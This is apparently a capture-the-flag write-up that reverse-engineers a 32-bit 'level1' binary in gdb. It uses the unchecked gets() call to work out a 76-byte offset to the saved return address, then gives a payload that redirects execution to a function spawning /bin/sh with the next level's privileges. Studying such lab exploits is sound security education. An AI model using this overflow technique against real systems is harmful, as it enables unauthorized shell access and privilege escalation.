Dump of assembler code for function run:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,ds:0x80497c0
   0x0804844f <+11>:	mov    edx,eax
   0x08048451 <+13>:	mov    eax,0x8048570
   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.

(gdb) x/s 0x80497c0
0x80497c0 <stdout@@GLIBC_2.0>:	 ""

(gdb) x/s 0x8048570
0x8048570:	 "Good... Wait what?\n"

We see a call to fwrite("Good... Wait what?\n", 1, 19, stdout)

(gdb) x/s 0x8048584
0x8048584:	 "/bin/sh"

and a call to system("/bin/sh")

Therefore, the C code should look like this:

void run(void)
{
    fwrite("Good... Wait what?\n", 1, 19, stdout);
    system("/bin/sh");
}

Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.

This small main function does :

0x08048486 <+6>:	sub    esp,0x50             --> reserve 0x50 = 80 bytes of stack space for local use
0x08048489 <+9>:	lea    eax,[esp+0x10]       --> set eax value 16 bytes over the stack pointer (esp)
0x0804848d <+13>:	mov    DWORD PTR [esp],eax  --> store the buffer address at the top of the stack
0x08048490 <+16>:	call   0x8048340 <gets@plt> --> call gets with this buffer

The C code should look like this :

int main(void)
{
    char buffer[64];
    gets(buffer);
    return 0;
}

Now we know that the run() function launches an interactive shell, and that the main fuction uses the gets() function which is deprecated because it can be overflowed when an input buffer is higher than the buffer size.

Our goal is to find the distance in bytes we have to fill to reach EIP (Extended Instruction Pointer) and modify the address it contains to  point towards the run () function address.

For that we need to look at the registers of the main function just before a call to gets()

(gdb) break *0x08048490 (0x08048490 is the adress of the call to gets ())
(gdb) run
(gdb) info register

eax            0xbffff6f0	-1073744144
ecx            0xbffff7d4	-1073743916
edx            0xbffff764	-1073744028
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff6e0	0xbffff6e0
ebp            0xbffff738	0xbffff738
esi            0x0	0
edi            0x0	0
eip            0x8048490	0x8048490 <main+16>
eflags         0x200282	[ SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51

At this point, EAX contains the address of the buffer passed to gets(): 0xbffff6f0

We also know that EBP contains the address : 0xbffff738

In a typical 32-bit x86 stack frame, the saved EIP is located at EBP + 4, immediately above the saved EBP.

The distance required to reach the saved EIP is the difference between the address of the saved EIP and the beginning of the buffer.
(0xbffff738 + 4) - 0xbffff6f0

(gdb) p (0xbffff738 + 4) - 0xbffff6f0
$2 = 76

Now, we have to set the EIP to the address of the run () function (0x08048444)

file ./level1 shows :
LSB executable (little endian)

Because the binary uses little-endian byte order, the address 0x08048444 is represented in memory as the byte sequence 44 84 04 08.

We can now use these informations to build a payload using 76 filler bytes followed by "0x44, 0x84, 0x04, 0x08" Which will call the run function , execute a shell with the Level 2 privileges.